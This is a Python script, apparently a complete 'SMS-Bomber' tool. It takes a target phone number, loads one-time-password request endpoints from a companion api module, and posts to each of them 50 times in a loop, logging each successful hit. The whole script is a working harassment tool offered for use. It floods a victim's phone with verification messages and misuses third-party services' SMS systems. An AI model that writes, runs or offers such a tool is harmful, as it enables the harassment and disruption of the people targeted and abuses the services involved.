from api import send_otp_requests,send_otp_requests_json
import requests #pip install requests
import pyfiglet #pip install pyfiglet
from colorama import Fore,init #pip install colorama

init()
print( Fore.RED + "************************************************************")
logo = pyfiglet.figlet_format("SMS-Bomber", font = "slant")
print(logo)
print(Fore.WHITE+"\t \t  By : " + Fore.RED + "FARBODxME" + Fore.YELLOW +" & "+ Fore.RED+"Mr-Akhoundi")
print("\t \t \t     V 1.0 - 2024")
print( Fore.WHITE+"SELECT Server SMS-Bomber:" + '\n' + Fore.RED + "--> 1" + Fore.YELLOW + " Server One" + '\n' + Fore.RED + "--> 2" + Fore.YELLOW + " Server Two" )

# get phone number from the user
try:
    servers = int(input(Fore.GREEN+"Server Number (1 or 2): "))
    number = str(input(Fore.GREEN+"Enter phone number without ---> 0 <---: "))

    # Get APIs from api.py
    if(servers == 1):
        apis = send_otp_requests(number) 
    elif(servers == 2):
        apis = send_otp_requests_json(number)

    # Loop to send OTPs 50 times
    for _ in range(50):
        for url, payload, in apis:
            try:
                if(servers == 1):
                    response = requests.post(url, data=payload)
                elif(servers == 2):
                    response = requests.post(url, json=payload)
                if response.status_code == 200:
                    print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url +')' +  '.' )
                
            except requests.exceptions.RequestException:
                pass
                
except KeyboardInterrupt:
    print("\nGoodbye!")